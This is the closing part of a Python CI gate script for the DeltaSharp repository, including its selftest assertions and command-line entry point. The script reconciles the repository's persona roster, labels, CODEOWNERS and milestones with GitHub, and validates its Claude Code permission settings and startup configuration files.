            "the report states the .mcp.json situation (absent, or present and untracked)",
        )
        # The defaults are asserted against LITERAL paths, never against the constants that
        # produced the output: comparing a run's output with the same constant it came from is
        # self-referential and would survive a typo in the default. These are the paths the
        # workflow path filters and the docs name, so a default that drifts is caught here.
        check(
            DEFAULT_MCP_CONFIG == ".mcp.json"
            and DEFAULT_SETTINGS == os.path.join(".claude", "settings.json")
            and settings_local_path(DEFAULT_SETTINGS)
            == os.path.join(".claude", "settings.local.json")
            and os.path.join(".claude", "settings.local.json") in _output,
            "--mcp-config/--settings default to the repo-root .mcp.json and .claude/settings*.json",
        )
        # CERT-F4: the argparse DEFAULTS for --skills-dir/--commands-dir are themselves a
        # policy surface — a typo there would scan nothing while the gate still said PASS.
        # This run passes NO directory flags, so it exercises the defaults end to end.
        # Killing mutant: DEFAULT_SKILLS_DIR = ".claude/skillz" (the skills scan would find
        # 0 manifests and the command-skill check would fail).
        _scanned = re.search(
            r"- (\d+) skill manifest\(s\) under (\S+) and (\d+) slash-command file\(s\) "
            r"under (\S+)",
            _output,
        )
        check_in_checkout(
            "[PASS] command-skill-frontmatter" in _output
            and _scanned is not None
            and int(_scanned.group(1)) >= 1
            and _scanned.group(2) == os.path.join(".claude", "skills")
            and _scanned.group(4) == os.path.join(".claude", "commands"),
            "the default --skills-dir/--commands-dir scan >= 1 real skill manifest",
        )

    # --- Finding 7a: resolve_repo must NOT shell out to gh under --offline.
    mod = sys.modules[__name__]
    original_gh = mod._gh
    gh_calls = {"n": 0}

    def _gh_must_not_run(*_args, **_kwargs):
        gh_calls["n"] += 1
        return (False, "", "gh must not be called under --offline")

    saved_repo_env = os.environ.pop("GITHUB_REPOSITORY", None)
    mod._gh = _gh_must_not_run
    try:
        offline_repo = resolve_repo(None, offline=True)
        check(
            offline_repo == DEFAULT_REPO and gh_calls["n"] == 0,
            "resolve_repo(--offline) resolves without shelling gh",
        )
    finally:
        mod._gh = original_gh
        if saved_repo_env is not None:
            os.environ["GITHUB_REPOSITORY"] = saved_repo_env

    # The FLOOR: properties of the RUN, not of the code under test. See
    # SELFTEST_ASSERTIONS_IN_CHECKOUT for the mode-by-mode contract. In short — the count is
    # asserted where nothing was skipped, the checkout-only assertions must have run wherever
    # they could, and under `strict` a skip or reduced coverage is itself a failure, because
    # in CI a skipped fixture group and a fixture group that stopped building look identical
    # (PR-901 third round L1/Info-2/3; fourth round Q1/F2).
    def floor(condition: bool, label: str) -> None:
        """Assert a property OF THE RUN ITSELF; not counted, or it would move the count."""
        if not condition:
            failures.append(label)
            _log(f" FAIL - {label}")

    if in_checkout:
        floor(
            tally["checkout_only"] == SELFTEST_CHECKOUT_ONLY_ASSERTIONS,
            f"selftest floor: {tally['checkout_only']} of "
            f"{SELFTEST_CHECKOUT_ONLY_ASSERTIONS} checkout-only assertion(s) ran inside a "
            f"git checkout",
        )
        if tally["skipped"] == 0:
            floor(
                tally["executed"] == SELFTEST_ASSERTIONS_IN_CHECKOUT,
                f"selftest floor: {tally['executed']} assertion(s) executed with no fixture "
                f"skipped, expected {SELFTEST_ASSERTIONS_IN_CHECKOUT} (update "
                f"SELFTEST_ASSERTIONS_IN_CHECKOUT when adding or removing an assertion)",
            )
    if strict:
        # The two ways a run can go green having covered less than it should: a fixture group
        # that could not build (or a guard that landed on the wrong block, which skips), and
        # an environment where the real `.claude` cannot be asked about at all.
        floor(
            tally["skipped"] == 0,
            f"selftest floor: --require-full-coverage run skipped {tally['skipped']} "
            f"fixture group(s) — {'; '.join(skipped_reasons)} — a full-coverage selftest "
            f"must execute every assertion",
        )
        floor(
            in_checkout,
            f"selftest floor: --require-full-coverage run has REDUCED coverage "
            f"({coverage_gap}) — "
            + (
                "install git and rerun"
                if coverage_gap == "git is not on PATH"
                else "run --selftest from the root of the git checkout it tests"
            ),
        )
    _log("")
    if failures:
        _error(f"selftest: {len(failures)} assertion(s) failed")
        return 1
    _summary = f"selftest: {tally['executed']} assertion(s) passed"
    if tally["skipped"]:
        _summary += f", {tally['skipped']} fixture group(s) skipped"
    if not in_checkout:
        _summary += f" ({coverage_gap}: coverage is REDUCED)"
    _log(_summary)
    return 0


# --- CLI ---------------------------------------------------------------------------------

def main(argv: "list[str] | None" = None) -> int:
    parser = argparse.ArgumentParser(
        description="Reconcile the DeltaSharp persona roster, persona: labels, CODEOWNERS, "
        "and the feature-request milestone dropdown against live GitHub state, and validate "
        "the .claude/settings.json permission surface, the command/skill front matter, and "
        "the tracked startup configuration (.mcp.json, .claude/settings.local.json)."
    )
    parser.add_argument("--repo", default=None, help="OWNER/REPO (default: env or gh or khaines/deltasharp)")
    parser.add_argument("--agents-dir", default=DEFAULT_AGENTS_DIR)
    parser.add_argument(
        "--commands-dir",
        default=DEFAULT_COMMANDS_DIR,
        help="directory of slash-command markdown files whose front matter is policed "
        f"(default: {DEFAULT_COMMANDS_DIR}; absent is fine)",
    )
    parser.add_argument(
        "--skills-dir",
        default=DEFAULT_SKILLS_DIR,
        help="directory of skills whose SKILL.md front matter is policed "
        f"(default: {DEFAULT_SKILLS_DIR}; absent is fine)",
    )
    parser.add_argument("--feature-form", default=DEFAULT_FEATURE_FORM)
    parser.add_argument("--taxonomy", default=DEFAULT_TAXONOMY)
    parser.add_argument(
        "--settings",
        default=DEFAULT_SETTINGS,
        help="Claude Code settings file whose permission allow/deny lists are validated "
        f"(default: {DEFAULT_SETTINGS})",
    )
    parser.add_argument(
        "--mcp-config",
        default=DEFAULT_MCP_CONFIG,
        help="repo-root MCP config whose tracked mcpServers are rejected — Claude Code "
        f"spawns each server command at launch with no prompt (default: {DEFAULT_MCP_CONFIG})",
    )
    parser.add_argument(
        "--validate-settings-only",
        action="store_true",
        help="run ONLY the settings-permissions check (local, no network) and exit — used by "
        "the workflow's fail-fast step",
    )
    parser.add_argument(
        "--ref",
        default=None,
        help="git ref/SHA whose CODEOWNERS to validate (default: $GITHUB_SHA, else the "
        "repo default branch). CI passes the PR head/merge SHA so a PR that breaks "
        "CODEOWNERS fails the PR gate, not only post-merge.",
    )
    parser.add_argument(
        "--offline",
        action="store_true",
        help="skip the LIVE GitHub-API checks (labels, milestones, CODEOWNERS); the roster is "
        "still reconciled against the persona labels documented in label-taxonomy.md",
    )
    parser.add_argument(
        "--require-remote",
        action="store_true",
        help="exit 2 if a live GitHub-API check cannot run (gh missing / API outage) — CI uses "
        "this so the gate cannot silently pass without verifying against live state",
    )
    parser.add_argument("--selftest", action="store_true", help="run built-in logic tests and exit")
    parser.add_argument(
        "--require-full-coverage",
        action="store_true",
        help="with --selftest: fail when any fixture group was skipped or coverage was "
        "reduced, instead of reporting it (default on under GITHUB_ACTIONS/CI)",
    )
    args = parser.parse_args(argv)

    if args.selftest:
        return _selftest(strict=args.require_full_coverage)

    if args.validate_settings_only:
        # Local, offline-safe, and independent of the roster/taxonomy/form inputs, so it can
        # run as its own fail-fast step without any GitHub state.
        results = [settings_result(args.settings)]
        _print_summary(results)
        _log("")
        if results[0].status == "fail":
            _error(
                "settings validation FAILED: the permission surface in "
                f"{args.settings} drifted — see annotations above"
            )
            return 1
        _log(
            f"settings validation PASSED: {args.settings} matches policy — no forbidden "
            f"mutating-command (compared case-insensitively), wildcard/glob or tool-wide "
            f"allow grant, no defaultMode outside default/plan; only 'permissions' plus "
            f"`$schema` and the listed inert keys at top level and only allow/deny/defaultMode inside 'permissions', so no "
            f"executable-valued key (hooks, env, apiKeyHelper, statusLine, ...) and no "
            f"additionalDirectories; all required deny entries present "
            f"(allow entries outside those rules are not policed)"
        )
        return 0

    try:
        results = run_checks(args)
    except (FileNotFoundError, ValueError) as exc:
        _error(str(exc))
        if any(marker in str(exc) for marker in INTEGRITY_CLAUSE_MARKERS):
            # The roster came up empty BECAUSE of integrity problems the gate found and
            # named (nested / unparseable / nameless wrappers). That is repo drift the
            # author can fix, so it exits 1 like every other drift — exit 2 is reserved for
            # "the gate could not run" (missing or genuinely empty agents dir, remote
            # outage), and mislabeling drift as an outage sends the responder to the wrong
            # runbook and invites a retry-until-green reflex.
            _error(
                "the agents directory yielded no roster entry because of the integrity "
                "problem(s) above — this is DRIFT to fix in the repo, not a remote outage"
            )
            return 1
        return 2

    _print_summary(results)

    failed = [r for r in results if r.status == "fail"]
    skipped = [r for r in results if r.status == "skip"]
    # A skip is partitioned by WHO must act, exactly as exit 1 vs exit 2 is: a REMOTE skip is
    # a gh/GitHub outage (wait, retry), a LOCAL skip is an environment this gate could not
    # interrogate (run it inside the git checkout). Both are "could not verify" — exit 2
    # under --require-remote — but they send the responder to different runbooks, so they are
    # never reported with the other's message.
    remote_skipped = [r for r in skipped if r.name in REMOTE_CHECK_NAMES]
    local_skipped = [r for r in skipped if r.name not in REMOTE_CHECK_NAMES]
    _log("")
    if failed:
        _error(f"reconciliation FAILED: {len(failed)} check(s) drifted — see annotations above")
        return 1
    if args.require_remote and local_skipped:
        # A LOCAL check that could not verify its input (e.g. git could not say whether a
        # startup config is tracked, or whether a path is a tracked symlink) must not go
        # green in CI: CI is precisely where those questions are knowable and decisive.
        #
        # Reported BEFORE the remote partition on purpose. The local one is the runner's own
        # environment — actionable right now, by the person running the gate — while a remote
        # outage is "wait and retry"; and `--offline` (a deliberate request to skip the remote
        # checks) puts every remote check in the skip bucket, so leading with the outage
        # message there would hand a responder a runbook for an outage that never happened.
        _error(
            f"reconciliation could not run: {len(local_skipped)} local check(s) could not "
            f"verify their input ("
            + "; ".join(r.name for r in local_skipped)
            + ") — this is an environment problem, not a remote outage and not drift; "
            + (
                "install git and rerun"
                if shutil.which("git") is None
                else "run the gate inside the git checkout"
            )
        )
        return 2
    if args.require_remote and remote_skipped:
        # A required remote check could not RUN. This is a gh/API OUTAGE, not roster drift:
        # exit 2 (distinct from the exit-1 drift signal) so an outage never reads as drift.
        _error(
            f"reconciliation could not run: {len(remote_skipped)} required remote check(s) "
            f"were unavailable (gh missing or a GitHub API error) — this is a remote outage, "
            f"not drift; retry once `gh` is authenticated and GitHub is reachable"
        )
        return 2
    if remote_skipped:
        # "passed locally" is a claim about the LOCAL checks, so it may only be made when
        # they all ran: printing it immediately above "N local check(s) could not verify
        # their input" told the reader two contradictory things in consecutive lines.
        locally = (
            "reconciliation passed locally"
            if not local_skipped
            else f"reconciliation passed on the {len(results) - len(skipped)} check(s) "
            f"that ran ({len(local_skipped)} local check(s) could not verify their input)"
        )
        _warning(
            f"{locally}; {len(remote_skipped)} remote check(s) skipped "
            f"(run with `gh` authenticated to verify labels/milestones/CODEOWNERS)"
        )
    if local_skipped:
        _warning(
            f"{len(local_skipped)} local check(s) could not verify their input: "
            + "; ".join(r.name for r in local_skipped)
        )
    if local_skipped or remote_skipped:
        # The full "are in step" sentence claims every surface was reconciled. When a check
        # SKIPPED, that claim is false for the surface it owns, and the success line is the
        # one line a passer-by reads (the warnings scroll past above it). Say exactly what
        # was established instead (LAST-CERT F5).
        _log(
            f"reconciliation passed on the checks that ran; "
            f"{len(local_skipped) + len(remote_skipped)} check(s) skipped "
            f"(see warnings above)"
        )
        return 0
    _log(
        "reconciliation PASSED: roster, labels, CODEOWNERS, milestones, the settings "
        "permission surface, the command/skill front matter, and the tracked startup "
        "configuration (.mcp.json, settings.local.json) are in step"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
